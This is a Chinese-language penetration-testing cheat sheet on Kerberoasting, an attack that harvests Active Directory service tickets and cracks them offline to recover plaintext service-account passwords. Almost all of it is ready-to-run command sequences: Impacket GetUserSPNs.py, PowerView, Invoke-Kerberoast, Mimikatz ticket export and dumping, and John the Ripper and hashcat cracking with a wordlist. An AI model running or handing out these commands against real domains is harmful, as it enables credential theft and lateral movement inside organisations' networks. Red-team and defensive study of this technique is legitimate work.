---
description: 基于Kerberos认证 / 获取TGS后进行离线暴破从而获取明文密码
---

# ✔️ Kerberoasting攻击

## 先决条件

* 已经获得目标域内的基本立足点（普通用户权限即可）
* 需要目标域内用户账户的SPN
* 需要获取到服务票据（TGS）
* 暴破工具 + 字典文件

## 常用工具

### Impacket

* 常用脚本：**GetUserSPNs.py**

```bash
# 识别SPN
python3 GetUserSPNs.py target.com/svc_tgs:xxxxxxxxxxxxxx -dc-ip 10.10.xxx.xxx
# 请求服务票据TGS
python3 GetUserSPNs.py target.com/svc_tgs:xxxxxxxxxxxxxx -dc-ip 10.10.xxx.xxx -request
# 导出票据文件
python3 GetUserSPNs.py target.com/svc_tgs:xxxxxxxxxxxxxx -dc-ip 10.10.xxx.xxx -request -outputfile hash.txt
```

### Powershell

* 常用脚本：**PowerView.ps1**

```powershell
# 识别SPN
Get-NetUser -username "svc_tgs" -SPN | select samaccountname, primarygroupid, serviceprincipalname

Import-Moudle .\PowerView.ps1
Get-NetUser -SPN

# Empire，指定获取到的票据以适用于hashcat暴破的格式输出
Import-Module .\Invoke-kerberoast.ps1
Invoke-Kerberoast -Domain target.com -OutputFormat Hashcat | fl

# 导出所有票据（和mimikatz类似）
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### mimikatz.exe

```powershell
mimikatz.exe
# 先提升权限
privilege::debug
# 查看当前票据
kerberos::list
# 获取当前的所有票据并导出
sekurlsa::tickets /export
# 将导出的.kirbi文件转换成txt文件，在用john the ripper或者hashcat进行离线暴破
```

### kerberoast

* 常用脚本：**tgscrepcrack.py、**GetUserSPNs.ps1、GetUserSPNs.vbs

```bash
# 离线暴破
python3 tgscrepcrack.py rockyou.txt xxxxxxxxxxxxxxxxxxxxx.kirbi
```

### John the Ripper

```bash
# 离线暴破
john --format=krb5tgs hash.txt rockyou.txt
```

### Hashcat

```bash
# 离线暴破
hashcat -m 13100 hash.txt rockyou.txt
```

{% hint style="info" %}
Kerberoasting攻击在内网渗透中很常见，本质上是通过获取目标域内的服务账户的服务票据（TGS），然后通过离线爆破来还原出明文密码。该攻击方式仅需要有目标域内的普通用户账户权限即可向DC请求相关的TGS。
{% endhint %}
